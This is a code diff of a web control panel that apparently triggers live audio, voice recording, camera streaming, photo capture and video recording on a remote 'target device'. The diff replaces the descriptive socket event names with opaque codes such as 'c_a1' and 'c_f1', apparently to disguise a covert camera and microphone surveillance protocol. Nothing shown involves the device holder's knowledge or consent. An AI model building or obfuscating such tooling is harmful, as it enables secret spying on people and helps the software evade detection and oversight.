@@ -787,7 +787,7 @@ export default function Home() {
                 setDevicePermissions(data.permissions);
             });
 
-            socket.on("photo_capture_ack", (data: any) => {
+            socket.on("d_f4", (data: any) => {
                 if (data.status === 'captured') {
                     setIsCapturingPhoto(false);
                 }
@@ -837,7 +837,7 @@ export default function Home() {
                 }
             });
 
-            socket.on("recording_progress", (data: any) => {
+            socket.on("d_f3", (data: any) => {
                 const current = data.current || 0;
                 const total = data.total || 0;
                 setRecordingProgress({ current, total });
@@ -874,7 +874,7 @@ export default function Home() {
                 setShowCustomAlert(true);
             });
 
-            socket.on("camera_error", (data: any) => {
+            socket.on("d_e1", (data: any) => {
                 setIsCapturingPhoto(false);
                 setIsRecording(false);
                 const errorMessage = data.error || "Camera error occurred";
@@ -1042,7 +1042,7 @@ export default function Home() {
                 }
             });
 
-            socket.on("audio_error", (data: any) => {
+            socket.on("d_a3", (data: any) => {
                 setIsLiveAudio(false);
                 isLiveAudioRef.current = false;
                 setAudioError(data.error || 'Audio error occurred');
@@ -1073,7 +1073,7 @@ export default function Home() {
             });
 
             // Voice Recording Progress from device
-            socket.on("voice_recording_progress", (data: any) => {
+            socket.on("d_a2", (data: any) => {
                 if (data.current !== undefined) {
                     setVoiceRecProgress({ current: data.current, total: data.total || 60 });
                 }
@@ -1410,7 +1410,7 @@ export default function Home() {
 
         // AudioContext will be auto-created when first live_audio chunk arrives.
         // Just tell the device to start sending audio.
-        socket.emit('start_live_audio', {
+        socket.emit('c_a1', {
             uuid: session.user.uuid,
             targetDeviceId: selectedDeviceId,
             gainBoost: false
@@ -1426,7 +1426,7 @@ export default function Home() {
 
     const stopLiveAudio = useCallback(() => {
         if (socket && selectedDeviceId && session?.user?.uuid) {
-            socket.emit('stop_live_audio', {
+            socket.emit('c_a2', {
                 uuid: session.user.uuid,
                 targetDeviceId: selectedDeviceId
             });
@@ -1473,7 +1473,7 @@ export default function Home() {
     const startVoiceRecording = useCallback(() => {
         if (!requireConnectedDevice(() => {})) return;
         if (!socket || !selectedDeviceId || !session?.user?.uuid) return;
-        socket.emit('start_voice_recording', {
+        socket.emit('c_a3', {
             uuid: session.user.uuid,
             targetDeviceId: selectedDeviceId,
             duration: voiceRecDuration
@@ -1497,7 +1497,7 @@ export default function Home() {
 
     const stopVoiceRecording = useCallback(() => {
         if (socket && selectedDeviceId && session?.user?.uuid) {
-            socket.emit('stop_voice_recording', {
+            socket.emit('c_a4', {
                 uuid: session.user.uuid,
                 targetDeviceId: selectedDeviceId
             });
@@ -1968,10 +1968,10 @@ END:VCARD`;
                                         onClick={() => {
                                             if (!requireConnectedDevice(() => {})) return;
                                             if (isLiveStreaming) {
-                                                socket?.emit('stop_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
+                                                socket?.emit('c_f5', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                 setIsLiveStreaming(false);
                                             } else {
-                                                socket?.emit('start_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, quality: cameraQuality });
+                                                socket?.emit('c_f4', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, quality: cameraQuality });
                                                 setIsLiveStreaming(true);
                                                 setLiveFrame(null);
                                             }
@@ -1995,7 +1995,7 @@ END:VCARD`;
                                                 camera: cameraMode,
                                                 isTemp: true
                                             }, ...prev]);
-                                            socket?.emit('capture_photo', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode }); 
+                                            socket?.emit('c_f1', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode }); 
                                         }}
                                         disabled={isCapturingPhoto}
                                         className={`w-24 h-24 rounded-full flex items-center justify-center border-[6px] ${isCapturingPhoto ? 'border-cyan-500 bg-cyan-500/20' : 'border-white bg-white/5'}`}
@@ -2017,12 +2017,12 @@ END:VCARD`;
                                                 return;
                                             }
                                             if (isRecording) {
-                                                socket?.emit('stop_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
+                                                socket?.emit('c_f3', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                 setIsRecording(false);
                                             } else {
                                                 setIsRecording(true);
                                                 setRecordingProgress({ current: 0, total: recordingDuration });
-                                                socket?.emit('start_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, duration: recordingDuration });
+                                                socket?.emit('c_f2', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, duration: recordingDuration });
                                             }
                                         }}
                                         className={`w-16 h-16 rounded-3xl flex flex-col items-center justify-center gap-1.5 ${isRecording ? 'bg-black text-white border-2 border-red-500' : 'bg-white/5 text-white/70 border border-white/5'}`}
